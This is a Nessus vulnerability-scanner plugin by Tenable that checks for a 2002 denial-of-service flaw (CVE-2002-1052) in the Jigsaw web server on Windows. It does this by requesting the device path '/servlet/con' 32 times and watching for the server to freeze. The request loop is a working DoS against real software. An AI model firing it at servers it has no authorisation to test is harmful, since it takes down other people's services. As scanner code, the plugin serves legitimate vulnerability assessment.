#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com> (nb: this domain no longer exists)
#      Added BugtraqID and CAN
#


include("compat.inc");


if(description)
{
 script_id(11047);
 script_version("$Revision: 1.24 $");
 script_cve_id("CVE-2002-1052");
 script_bugtraq_id(5258);
 script_osvdb_id(4629);

 script_name(english:"Jigsaw Webserver MS/DOS Device Request Remote DoS");
 script_summary(english:"Jigsaw DOS dev DoS");
 
  script_set_attribute(
   attribute:"synopsis",
   value:"The remote web server has a denial of service vulnerability."
 );
 script_set_attribute( attribute:"description",  value:
"The version of Jigsaw web server running on the remote host has a
denial of service vulnerability.  It was possible to exhaust all of
the web server's available threads by requesting '/servlet/con' about
thirty times.  A remote attacker could exploit this to repeatedly
freeze the web server." );
 script_set_attribute(
   attribute:"see_also",
   value:"http://seclists.org/bugtraq/2002/Jul/191"
 );
 script_set_attribute(
   attribute:"solution", 
   value:"Upgrade to the latest version of this software."
 );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2002/07/17");
 script_set_attribute(attribute:"vuln_publication_date", value: "2002/07/17");
 script_cvs_date("$Date: 2016/11/19 01:42:50 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 script_family(english:"Web Servers");

 script_copyright(english:"This script is Copyright (C) 2002-2016 Tenable Network Security, Inc.");

 script_dependencie("find_service1.nasl", "os_fingerprint.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


os = get_kb_item("Host/OS");
if ( ! os || "Windows" >!< os ) exit(0);

port = get_http_port(default:80);
if (http_is_dead(port: port)) exit(0);
banner = get_http_banner(port:port);
if (! banner || "Jigsaw" >!< banner ) exit(0);


url = '/servlet/con';

for (i=0; i<32;i=i+1)
{
 res = http_send_recv3(method:"GET", item:url, port:port);

 if (isnull(res))
 {
   security_warning(port);
   exit(0);
 }
}

if(http_is_dead(port:port))security_warning(port);


